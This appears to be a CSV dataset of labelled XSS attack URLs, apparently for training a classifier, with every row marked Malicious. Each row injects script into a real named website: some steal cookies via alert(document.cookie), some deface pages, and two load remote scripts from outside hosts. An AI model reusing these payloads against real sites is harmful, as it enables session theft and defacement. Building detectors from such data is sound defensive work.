Payloads,Class
http://gamestats.gamespy.com/actofwarht/rank.asp?nick=%22%3e%3cscript%3ealert(document.cookie)%3c/sc<br>ript%3e,Malicious
http://jp.caribbeancomgirl.com/fast-cgi/search.fcgi?category=all&amp;name=%22%3e'%3e%22%3c'%3c%3cscript%<br>3e%3c/script%3e'%%3c'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
"http://neworder.box.sk//redirect.php?l=32174&amp;&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83,32,98,121,<br>32,66,117,103,66,117,115,116,101,114,32));&lt;/script&gt;",Malicious
http://myask.jp.ask.com/user/displaysignin;jsessionid=d7cafbe75b9b5c2e38365fc73da1596c?returl=%22%3e<br>%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%<br>64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%3<br>1%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70<br>%74%3e%0a,Malicious
http://www.owsianowski.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://promoddl.com/ddl.php?q=%3ch1%3e%3ccenter%3ehacking-gurus%3c/center%3e%3cbr%3e%3cmarquee%3edon<br>t-mess-with-us%3c/marquee%3e%3c/h1%3e,Malicious
http://www.logement.gouv.fr/_archive_article.php3?id_rubrique=%3e%22%3e%3cscript%20%0a%0d%3ealert%28<br>%27xss%20by%20wazo%27%29%3b%3c/script%3e&amp;date=2009-01-01&amp;masquable=ok,Malicious
http://www.investsmart.com.au/shares/search.asp?action=search&amp;mainsearch=%22%3cscript+src%3dhttp://v<br>uln.xssed.net/thirdparty/scripts/hotpockets.js%3e,Malicious
http://benq.com.ua/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://tv.sfr.fr/guide-tv/index.php?b=58%22%3e%3cscript%3ealert(/xss/.source)%3c/script%3e,Malicious
http://www.toptenscripts.com/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.visitphoenix.com/listings/index.cfm?action=showsub&amp;catid=12&amp;subcatid=%22%3e%3cmarquee%3e%<br>3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3cbody%20onload=alert(1)%3e,Malicious
http://www.michelin.dk/dk/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://apidoc.digg.com/?raw=%3cscript%3ealert(1)%3c/script%3e,Malicious
